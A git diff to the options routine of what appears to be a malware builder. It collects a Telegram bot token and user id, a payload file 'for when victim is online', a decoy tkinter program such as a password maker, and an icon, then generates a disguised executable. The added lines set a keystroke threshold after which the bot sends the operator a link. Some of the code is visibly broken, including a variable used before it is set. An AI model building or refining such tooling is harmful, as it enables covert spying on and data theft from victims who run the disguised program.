@@ -117,11 +117,14 @@ def get_options(): # get all of inputs and make python file
         # get inputs
         id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
         token = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram bot token here: ")).lower()
-        name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your application name: ")).lower()        
-        
+        name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your application name: ")).lower()      
+        try:
+            max_letter = int(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your max letter value(after that bot send you a link on note. its faster! | just write number without space): "))  
+        except: print(Fore.RED + "Invalid input(Just write number without space).")
         code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build): ")).lower()    
         offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custom offline tkinter code write C if not press enter: ")).lower()    
-        platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " Choice your platform(windows, linux, mac): ")).lower()
+        platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " choice your platform(windows, linux, mac): ")).lower()
+        icon_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your icon file address(.ico): "))
         # validate the inputs
         if platform_inp.startswith("win"):
             platform = "builder/windows-build.py"
@@ -134,10 +137,11 @@ def get_options(): # get all of inputs and make python file
             print(Fore.RED + "This platform dosnt exist!")
             exit()
         offline_code_addr = offline_code_addr_inp if offline_code_addr_inp.endswith(".py") else "builder/tk_payloads/offline/no_internet.py"
-        icon = icon_inp if icon.endswith(".ico") else "icongallery/icon.ico"
+        icon = icon_inp if icon.endswith(".ico") else print("ERROR WHILE READING ICON"), "icongallery/icon.ico"
+        print(f"ICON : {icon}")
         code_addr = code_addr_inp if code_addr_inp.endswith(".py") else "builder/tk_payloads/password_maker.py"
         # make python file
-        make.make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr, PLATFORM=platform)
+        make.make_python(ID=id, TOKEN=token, NAME=name, MAX_LETTER=max_letter, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr, PLATFORM=platform)
         exe = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
         # make the exe and exit from program
         make.make_exe(NAME=name, ICON=icon) if exe == "y" else exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
